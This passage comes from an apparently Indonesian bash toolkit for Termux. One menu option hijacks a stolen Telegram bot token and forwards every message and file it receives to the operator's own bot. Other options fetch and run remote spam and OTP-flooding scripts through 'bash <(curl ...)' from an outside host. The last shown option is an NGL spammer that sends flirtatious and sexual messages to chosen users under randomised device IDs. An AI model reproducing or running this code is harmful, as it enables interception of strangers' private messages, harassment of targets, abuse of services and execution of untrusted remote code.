echo 'echo "Apa Lu Kontol"' > $PREFIX/lib/bash/otp
elif [[ $no == "s3" || $no == "S3" ]]; then
MONITORING() {
clear
cowsay -f eyes "Konfigurasi Bot" | lolcat
e "$c"
IFS= read -r -e -p "Masukkan Bot Tele Target : " target
IFS= read -r -e -p "Masukkan Bot Tele Anda  : " anda
IFS= read -r -e -p "Masukkan Chat ID Tele Anda : " anda2
clear
TARGET_TOKEN="$target"
MY_TOKEN="$anda"
MY_CHAT_ID="$anda2"
token_status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.telegram.org/bot$TARGET_TOKEN/getMe")
chat_status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.telegram.org/bot$TARGET_TOKEN/sendMessage?chat_id=$MY_CHAT_ID&text=Cek%20Validasi")
URL="https://api.telegram.org/bot$TARGET_TOKEN"
BOT_INFO=$(curl -s "$URL/getMe")
BOT_NAME=$(echo "$BOT_INFO" | grep -oP '"first_name":"\K[^"]+')
BOT_USERNAME=$(echo "$BOT_INFO" | grep -oP '"username":"\K[^"]+')
BOT_ID=$(echo "$BOT_INFO" | grep -oP '"id":\K[0-9]+')
OFFSET=0
LOG_FILE="/sdcard/Hasil_Pengambilan_Data_Bot.log"
touch "$LOG_FILE"
log() {
local timestamp=$(date +"%Y-%m-%d %T")
echo "[$timestamp] $1" >> "$LOG_FILE"
}
notify() {
echo "[NOTIFY] $1"
}
get_extension() {
local mime_type=$(echo "$1" | tr '[:upper:]' '[:lower:]')
case "$mime_type" in
"image/jpeg" | "image/jpg") echo "jpg" ;;
"image/png") echo "png" ;;
"image/gif") echo "gif" ;;
"image/webp") echo "webp" ;;
"video/mp4" | "video/mpeg4") echo "mp4" ;;
"video/quicktime") echo "mov" ;;
"video/x-msvideo") echo "avi" ;;
"video/x-matroska") echo "mkv" ;;
"video/webm") echo "webm" ;;
"audio/mpeg") echo "mp3" ;;
"audio/ogg") echo "ogg" ;;
"audio/wav") echo "wav" ;;
"audio/x-wav") echo "wav" ;;
"audio/webm") echo "weba" ;;
"application/pdf") echo "pdf" ;;
"application/zip") echo "zip" ;;
"application/x-zip-compressed") echo "zip" ;;
"application/vnd.rar") echo "rar" ;;
"application/x-rar-compressed") echo "rar" ;;
"application/x-7z-compressed") echo "7z" ;;
"text/plain") echo "txt" ;;
"application/msword") echo "doc" ;;
"application/vnd.openxmlformats-officedocument.wordprocessingml.document") echo "docx" ;;
"application/vnd.ms-excel") echo "xls" ;;
"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet") echo "xlsx" ;;
"application/vnd.ms-powerpoint") echo "ppt" ;;
"application/vnd.openxmlformats-officedocument.presentationml.presentation") echo "pptx" ;;
"application/octet-stream")
case "$2" in
*".mp4"*) echo "mp4" ;;
*".mov"*) echo "mov" ;;
*".avi"*) echo "avi" ;;
*".mkv"*) echo "mkv" ;;
*".mp3"*) echo "mp3" ;;
*) echo "bin" ;;
esac
;;
*) case "$2" in
*".mp4"*) echo "mp4" ;;
*".mov"*) echo "mov" ;;
*".avi"*) echo "avi" ;;
*".mkv"*) echo "mkv" ;;
*".mp3"*) echo "mp3" ;;
*".jpg" | *".jpeg"*) echo "jpg" ;;
*".png"*) echo "png" ;;
*".pdf"*) echo "pdf" ;;
*".zip"*) echo "zip" ;;
*".rar"*) echo "rar" ;;
*) echo "bin" ;;
esac ;;
esac
}
get_mime_type() {
local file_path="$1"
file --mime-type -b "$file_path" 2> /dev/null | tr -d '\r' || echo "application/octet-stream"
}
get_file_info() {
local file_id="$1"
local max_retries=3
local retry_count=0
local result=""
while [ $retry_count -lt $max_retries ]; do
result=$(curl -s "https://api.telegram.org/bot$TARGET_TOKEN/getFile?file_id=$file_id")
local file_path=$(echo "$result" | jq -r '.result.file_path')
if [ -n "$file_path" ] && [ "$file_path" != "null" ]; then
echo "$result"
return 0
fi
retry_count=$((retry_count + 1))
sleep 1
done
log "Failed to get file info after $max_retries attempts for file_id: $file_id"
echo "{\"ok\":false,\"description\":\"Failed to get file info after $max_retries attempts\"}"
return 1
}
send_file() {
local FILE_ID="$1"
local FIELD="$2"
local ENDPOINT="$3"
local FILE_NAME="$4"
if [ -z "$FILE_ID" ]; then
log "No file ID provided"
return 1
fi
FILE_INFO=$(get_file_info "$FILE_ID")
FILE_PATH=$(echo "$FILE_INFO" | jq -r '.result.file_path')
if [ -z "$FILE_PATH" ] || [ "$FILE_PATH" = "null" ]; then
log "Could not get file path for file_id: $FILE_ID"
log "API Response: $FILE_INFO"
send_message "⚠️ Failed to process file (ID: $FILE_ID). Please try again or use a different file."
return 1
fi
TEMP_FILE="temp_$(date +%s%N)"
local download_success=false
for i in {1..3}; do
if curl -s -o "$TEMP_FILE" "https://api.telegram.org/file/bot$TARGET_TOKEN/$FILE_PATH"; then
if [ -s "$TEMP_FILE" ]; then
download_success=true
break
fi
fi
sleep 1
done
if [ "$download_success" = false ]; then
log "Failed to download file after 3 attempts: $FILE_PATH"
rm -f "$TEMP_FILE" 2> /dev/null
send_message "⚠️ Failed to download file (Path: $FILE_PATH). Please try again."
return 1
fi
MIME_TYPE=$(get_mime_type "$TEMP_FILE")
EXT=$(get_extension "$MIME_TYPE" "$FILE_PATH")
if [ -n "$FILE_NAME" ]; then
OUTPUT_FILE="$FILE_NAME"
if [[ $OUTPUT_FILE != *".$EXT" ]]; then
OUTPUT_FILE="${OUTPUT_FILE%.*}.$EXT"
fi
else
if [[ $FILE_PATH == *"/"* ]]; then
OUTPUT_FILE=$(basename "$FILE_PATH")
if [[ $OUTPUT_FILE != *.* ]]; then
OUTPUT_FILE="$OUTPUT_FILE.$EXT"
fi
else
OUTPUT_FILE="file_$(date +%s).$EXT"
fi
fi
mv "$TEMP_FILE" "$OUTPUT_FILE" 2> /dev/null || {
log "Failed to rename file, using temporary name"
OUTPUT_FILE="$TEMP_FILE"
}
if [ ! -s "$OUTPUT_FILE" ]; then
log "Output file is empty: $OUTPUT_FILE"
rm -f "$OUTPUT_FILE" 2> /dev/null
send_message "⚠️ Failed to process file (empty output). Please try again."
return 1
fi
local send_result=""
case "$ENDPOINT" in
"sendDocument")
send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F document=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
;;
"sendPhoto")
send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F photo=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
;;
"sendAudio")
send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F audio=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
;;
"sendVideo")
send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F video=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
;;
"sendVoice")
send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F voice=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
;;
*) send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F document=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/sendDocument") ;;
esac
if echo "$send_result" | jq -e '.ok' > /dev/null; then
log "Successfully forwarded file: $OUTPUT_FILE"
log "API Response: $send_result"
else
log "Failed to send file: $(echo "$send_result" | jq -r '.description // "unknown error"')"
log "Full Response: $send_result"
fi
rm -f "$OUTPUT_FILE" 2> /dev/null
}
send_message() {
local text="$1"
local result=$(curl -s -X POST "https://api.telegram.org/bot$MY_TOKEN/sendMessage" \
-d "chat_id=$MY_CHAT_ID" \
-d "text=$(echo "$text" | sed 's/\"/\\\"/g')")
if ! echo "$result" | jq -e '.ok' > /dev/null; then
log "Failed to send message: $(echo "$result" | jq -r '.description // "unknown error"')"
fi
}
banner() {
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⠶⠶⠶⠶⠶⠶⠶⢖⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡞⠁⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠈⠹⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⠋⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣦⣀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡾⠁⠀⣠⡾⢁⣾⡿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣆⠹⣦⠀⠀⢻⣆⠀⠀⠀⠀
⠀⠀⢀⡾⠁⢀⢰⣿⠃⠾⢋⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⠀⢹⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡌⠻⠆⢿⣧⢀⠀⢻⣆⠀⠀⠀
⠀⠀⣾⠁⢠⡆⢸⡟⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣦⡸⣿⠀⣆⠀⢿⡄⠀⠀
⠀⢸⡇⠀⣽⡇⢸⣿⠟⢡⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠙⢿⣿⠀⣿⡀⠘⣿⠀⠀
⡀⣿⠁⠀⣿⡇⠘⣡⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣦⡙⠀⣿⡇⠀⢻⡇⠀
⢸⡟⠀⡄⢻⣧⣾⡿⢋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣴⣿⠉⡄⢸⣿⠀
⢾⡇⢰⣧⠸⣿⡏⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠀⠓⢶⠶⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠙⣿⡟⢰⡧⠀⣿⠀
⣸⡇⠰⣿⡆⠹⣠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣿⡏⠀⠠⢺⠢⠀⠀⣿⣷⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠸⠁⣾⡇⠀⣿⠀
⣿⡇⠀⢻⣷⠀⣿⡿⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡅⠀⠀⢸⡄⠀⠀⣿⣿⣿⣿⣿⣿⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡆⣰⣿⠁⠀⣿⠀
⢸⣧⠀⡈⢿⣷⣿⠃⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣇⠀⢀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⡀⢿⣧⣿⠃⡀⢸⣿⠀
⠀⣿⡀⢷⣄⠹⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣿⣿⠀⣼⣿⣿⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⡟⢁⣴⠇⣼⡇⠀
⠀⢸⡇⠘⣿⣷⡈⢰⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢰⣿⡧⠈⣴⣿⠏⢠⣿⠀⠀
⠀⠀⢿⡄⠘⢿⣿⣦⣿⣯⠘⣆⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⡎⢸⣿⣣⣾⡿⠏⠀⣾⠇⠀⠀
⠀⠀⠈⢷⡀⢦⣌⠛⠿⣿⡀⢿⣆⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢀⣿⡁⣼⡿⠟⣉⣴⠂⣼⠏⠀⠀⠀
⠀⠀⠀⠈⢷⡈⠻⣿⣶⣤⡁⠸⣿⣆⠡⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣾⡟⠀⣡⣴⣾⡿⠁⣴⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣄⠈⢙⠿⢿⣷⣼⣿⣦⠹⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢡⣾⣿⣶⣿⠿⢛⠉⢀⣾⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣧⡀⠳⣦⣌⣉⣙⠛⠃⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠐⠛⠋⣉⣉⣤⡶⠁⣰⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠙⠛⠿⠿⠿⠿⠟⠛⠛⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠙⠟⠛⠿⠿⠿⠿⠟⠛⠁⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢶⣄⠙⠶⣦⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⡶⠖⣁⣴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⡉⠉⠉⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠉⠉⠉⠉⣡⣴⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⢦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣠⣴⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠋⠉⠁⠀⠀
MONITORING BOT TARGET⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
info() {
e $p $bg_lg"==============[$m INFORMASI TARGET $p ] ================$res"
e $b "[$c •$b ]$k Status Token$m   :$bl $BOT_ID ***** $k($c Kode$lg:$bl $token_status$k)"
e $b "[$c •$b ]$k Status Chat ID$m :$bl $MY_CHAT_ID $k($c Kode$lg:$bl $chat_status$k)"
e $b "[$c •$b ]$k Name Bot Tele$m  :$bl $BOT_NAME"
e $b "[$c •$b ]$k Username Bot$m   :$bl $BOT_USERNAME"
e $p $bg_lg"==============[$m MONITORING $p ] ======================$res"
}
banner | lolcat
info
notify "Bot forwarder started"
notify "Log file: $LOG_FILE"
log "Starting bot forwarder..."
log "Monitoring bot: $TARGET_TOKEN"
log "Forwarding to chat ID: $MY_CHAT_ID"
e $bg_lg $m"KETIK q Lalu ENTER untuk menghentikan monitoring$res"
while true; do
RESP=$(curl -s "https://api.telegram.org/bot$TARGET_TOKEN/getUpdates?offset=$OFFSET")
RESULTS=$(echo "$RESP" | jq -c '.result')
COUNT=$(echo "$RESULTS" | jq 'length' 2> /dev/null)
COUNT=${COUNT:-0}
if [ "$COUNT" -gt 0 ]; then
LAST_ID=$(echo "$RESULTS" | jq '.[-1].update_id')
OFFSET=$((LAST_ID + 1))
echo "$RESULTS" | jq -c '.[]' | while read -r UPDATE; do
MESSAGE=$(echo "$UPDATE" | jq '.message')
CHAT_ID=$(echo "$MESSAGE" | jq -r '.chat.id')
notify "New message received from chat ID: $CHAT_ID"
log "Received update from chat ID: $CHAT_ID"
log "Update content: $UPDATE"
TEXT=$(echo "$MESSAGE" | jq -r '.text // empty')
if [ -n "$TEXT" ] && [ "$TEXT" != "/start" ]; then
notify "Forwarding text message"
log "Forwarding text message: $TEXT"
send_message "$TEXT"
fi
declare -A FILE_TYPES=(
["photo"]="sendPhoto"
["document"]="sendDocument"
["audio"]="sendAudio"
["voice"]="sendVoice"
["video"]="sendVideo"
["sticker"]="sendDocument"
["animation"]="sendDocument"
["video_note"]="sendVideo")
for field in "${!FILE_TYPES[@]}"; do
if [ "$field" = "photo" ]; then
FILE_ID=$(echo "$MESSAGE" | jq -r ".$field[-1].file_id // empty")
else
FILE_ID=$(echo "$MESSAGE" | jq -r ".$field.file_id // empty")
fi
if [ -n "$FILE_ID" ]; then
notify "Forwarding $field file"
log "Forwarding $field with ID: $FILE_ID"
case "$field" in
"sticker")
send_file "$FILE_ID" "$field" "${FILE_TYPES[$field]}" "sticker.webp"
;;
"animation")
send_file "$FILE_ID" "$field" "${FILE_TYPES[$field]}" "animation.mp4"
;;
"video_note")
send_file "$FILE_ID" "$field" "${FILE_TYPES[$field]}" "video_note.mp4"
;;
*)
FILE_NAME=$(echo "$MESSAGE" | jq -r ".$field.file_name // empty")
send_file "$FILE_ID" "$field" "${FILE_TYPES[$field]}" "$FILE_NAME"
;;
esac
fi
done
done
fi
sleep 1
read -t 5 -p "" user_input
if [[ $user_input == "q" ]]; then
echo "[!] Script Dihentikan oleh Pengguna."
break
fi
done
}
MONITORING
elif [[ $no == "s4" || $no == "S4" ]]; then
cek_akses
$paket install dialog fzf tmux -y
clear
banner5 | lolcat
bash <(curl -sL "https://kontollukecilkocak.vercel.app/number_edit")
dialog --infobox "Menyiapkan script spam..!." 6 50
sleep 1
session="AllSpamming"
tmux new-session -d -s "$session" "bash <(curl -fsSL https://kontollukecilkocak.vercel.app/multi_spam.sh)"
tmux split-window -v -t "$session:0.0" "bash <(curl -fsSL https://kontollukecilkocak.vercel.app/otp_tele.sh)"
tmux select-pane -t "$session:0.0"
tmux split-window -h -t "$session:0.0" "bash <(curl -fsSL https://kontollukecilkocak.vercel.app/spam_pair.sh)"
tmux select-pane -t "$session:0.1"
tmux split-window -h -t "$session:0.1" "bash <(curl -fsSL https://kontollukecilkocak.vercel.app/tele_spam.sh)"
tmux select-pane -t "$session:0.3"
tmux split-window -v -t "$session:0.3" "echo -e '\n[!] Tekan ENTER untuk menghentikan semua proses spam...'; read; pkill -f multi_spam.sh; pkill -f otp_tele.sh; pkill -f spam_pair.sh; pkill -f tele_spam.sh; echo '[✔] Semua proses dihentikan'; IFS= read -r -e -p 'Tekan ENTER untuk keluar...'; tmux kill-session -t $session"
tmux select-layout -t "$session" tiled
tmux select-pane -t "$session:0.0"
tmux attach-session -t "$session"
elif [[ "$no" == "S5" || "$no" == "s5" ]]; then
bash <(curl -sL "https://kontollukecilkocak.vercel.app/gmail")
elif [[ "$no" == "s6" || "$no" == "S6" ]]; then
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
CYAN="\033[1;36m"
RESET="\033[0m"
pesanlist=(
"Aku kangen sama senyummu 😉"
"Bayangin aku lagi deket banget sama kamu sekarang"
"Kamu bikin aku susah fokus 😏"
"Aku suka banget caramu bikin aku nyaman"
"Kalau kamu di sini, aku nggak akan ngelepasin kamu"
"Malam ini cuma pengen denger suaramu sebelum tidur"
"Aku suka tatapan matamu… bikin deg-degan"
"Pelukanmu pasti bikin aku betah banget"
"Kamu selalu ada di pikiranku"
"Aku pengen kamu jadi yang terakhir aku lihat sebelum tidur"
"Kamu bikin aku pengen lebih dekat lagi"
"Setiap chat darimu selalu bikin aku senyum sendiri"
"Aku nggak bisa berhenti mikirin kamu"
"Boleh nggak aku curi sedikit waktumu buat aku aja?"
"Kalau ada kamu, dunia terasa lebih indah"
"Aku suka caramu bikin aku merasa istimewa"
"Kamu bikin aku pengen manja"
"Jujur, aku penasaran gimana rasanya ada di sampingmu sekarang"
"Kalau aku bisik sesuatu di telingamu, kamu mau dengerin? 😏"
"Aku suka sisi misteriusmu"
"Kamu selalu bikin aku pengen deket terus"
"Andai bisa, aku pengen cium keningmu sekarang"
"Aku pengen gandeng tanganmu sepanjang jalan"
"Kamu manis, tapi kadang bikin aku panas juga 😘"
"Aku nggak capek kalau ngobrol sama kamu, malah nagih"
"Tidur cukup ya, biar aku mimpiin kamu malam ini"
"Aku suka bayangin kita berdua di tempat sepi, cuma berdua"
"Kamu tahu nggak? Senyummu itu candu buatku"
"Aku nggak butuh kopi, cukup kamu aja bikin melek"
"Aku pengen jadi alasan kamu deg-degan"
"Kalau aku peluk kamu dari belakang, kamu izinin?"
"Kamu bikin aku pengen nakal dikit ��"
"Kalau kita berdua, kira-kira gimana ya rasanya?"
"Aku suka cara kamu bikin aku nggak bisa move on"
"Kamu bikin aku pengen nyium kamu pelan-pelan"
"Aku nggak bisa bohong, kamu bikin aku panas dingin"
"Andai sekarang aku bisa elus pipimu"
"Kamu itu bikin candu, tahu nggak?"
"Aku suka mainin rambutmu kalau lagi dekat"
"Kamu manis banget, tapi aku yakin bisa bikin kamu lebih panas 😘"
"Aku suka cara kamu bikin aku kepikiran terus"
"Kalau aku bisik kata nakal ke kamu, kamu marah nggak?"
"Aku pengen banget habisin waktu berdua sama kamu"
"Kamu lebih indah dari mimpi-mimpiku"
"Aku suka bayangin kamu pake baju favoritmu"
"Kalau aku bilang kamu seksi, kamu percaya nggak?"
"Kamu itu kombinasi manis + hot yang pas banget"
"Aku pengen tahu, kamu suka dipeluk erat atau dicium lama?"
)
banner() {
echo -e "${CYAN}
███╗   ██╗ ██████╗ ██╗
████╗  ██║██╔════╝ ██║
██╔██╗ ██║██║  ███╗██║
██║╚██╗██║██║   ██║██║
██║ ╚████║╚██████╔╝███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ Spammer !
${RESET}"
}
cek_username() {
local uname="$1"
result=$(curl -s -o /dev/null -w "%{http_code}" "https://ngl.link/$uname")
if [[ "$result" == "200" ]]; then
return 0
else
return 1
fi
}
clear
banner
IFS= read -r -e -p "🔹 Masukkan username (pisahkan dengan koma): " input_username
IFS=',' read -ra username_list <<< "$input_username"
valid_usernames=()
for uname in "${username_list[@]}"; do
uname_clean=$(echo "$uname" | xargs)
if cek_username "$uname_clean"; then
valid_usernames+=("$uname_clean")
else
echo -e "${RED}✖ Username \"$uname_clean\" tidak valid. Lewati.${RESET}"
fi
done
if [[ ${#valid_usernames[@]} -eq 0 ]]; then
echo -e "${RED}✖ Tidak ada username valid. Keluar.${RESET}"
sleep 5
fi
total=0
loading() {
echo -ne "${YELLOW}⏳ Mengirim"
for i in {1..3}; do
echo -n "."
sleep 0.2
done
echo -ne "\r                                     \r"
}
while true; do
clear
banner
echo
echo -e "${BLUE}Pilih mode pesan:${RESET}"
echo -e "${CYAN}1)${RESET} Mode otomatis (acak terus-menerus)"
echo -e "${CYAN}2)${RESET} Tulis pesan manual"
echo -e "${CYAN}q)${RESET} Keluar"
echo
IFS= read -r -e -p "🔸 Pilihan: " mode
if [[ "$mode" == "q" ]]; then
echo -e "${YELLOW}Keluar...${RESET}"
break
fi
case "$mode" in
1)
berhasil=0
gagal=0
berhasil_list=()
gagal_list=()
stty -echo -icanon time 0 min 0
while true; do
clear
banner
echo -e "${CYAN}🌀 Mode otomatis aktif (tekan 'q' untuk berhenti)${RESET}"
key=$(dd bs=1 count=1 2> /dev/null)
if [[ "$key" == "q" ]]; then
echo -e "${YELLOW}➡️  Dihentikan oleh user (tekan q). Menampilkan ringkasan...${RESET}"
break
fi
for user in "${valid_usernames[@]}"; do
((total++))
pesan="${pesanlist[$RANDOM % ${#pesanlist[@]}]}"
device_id=$(cat /proc/sys/kernel/random/uuid | tr 'A-Z' 'a-z')
loading
response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://ngl.link/api/submit" \
-H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
-H "Origin: https://ngl.link" \
-H "Referer: https://ngl.link/$user" \
--data-urlencode "username=$user" \
--data-urlencode "question=$pesan" \
--data-urlencode "deviceId=$device_id" \
--data-urlencode "gameSlug=" \
--data-urlencode "referrer=")
if [[ "$response" == "200" ]]; then
((berhasil++))
berhasil_list+=("[$total] @$user: $pesan")
echo -e "${GREEN}✅ [$total] Sukses ke @$user: \"$pesan\"${RESET}"
else
((gagal++))
gagal_list+=("[$total] @$user: $pesan (Status: $response)")
echo -e "${RED}❌ [$total] Gagal ke @$user: \"$pesan\" (Status: $response)${RESET}"
fi
done
sleep 0.3
done
stty sane
echo
echo -e "${CYAN}📊 RINGKASAN PENGIRIMAN:${RESET}"
echo -e "${GREEN}✔️ Berhasil: $berhasil${RESET}"
echo -e "${RED}❌ Gagal: $gagal${RESET}"
echo -e "${YELLOW}📦 Total: $total${RESET}"
echo
if [[ $berhasil -gt 0 ]]; then
echo -e "${GREEN}✅ Daftar pesan berhasil:${RESET}"
for msg in "${berhasil_list[@]}"; do
echo -e "   ${GREEN}$msg${RESET}"
done
fi
if [[ $gagal -gt 0 ]]; then
echo -e "${RED}❌ Daftar pesan gagal:${RESET}"
for msg in "${gagal_list[@]}"; do
echo -e "   ${RED}$msg${RESET}"
done
fi
echo
echo -e "${BLUE}🔚 ENTER untuk kembali ke menu${RESET}"
read
;;
2)
clear
banner
IFS= read -r -e -p "✏️  Ketik pesan (atau 'q' untuk keluar): " pesan
if [[ "$pesan" == "q" ]]; then
echo -e "${YELLOW}Keluar...${RESET}"
break 2
fi
if [[ -z "$pesan" ]]; then
echo -e "${RED}⚠️  Pesan kosong. Keluar...${RESET}"
break
fi
while true; do
clear
banner
for user in "${valid_usernames[@]}"; do
((total++))
device_id=$(cat /proc/sys/kernel/random/uuid | tr 'A-Z' 'a-z')
loading
response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://ngl.link/api/submit" \
-H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
-H "Origin: https://ngl.link" \
-H "Referer: https://ngl.link/$user" \
--data-urlencode "username=$user" \
--data-urlencode "question=$pesan" \
--data-urlencode "deviceId=$device_id" \
--data-urlencode "gameSlug=" \
--data-urlencode "referrer=")
if [[ "$response" == "200" ]]; then
((berhasil++))
berhasil_list+=("[$total] @$user: $pesan")
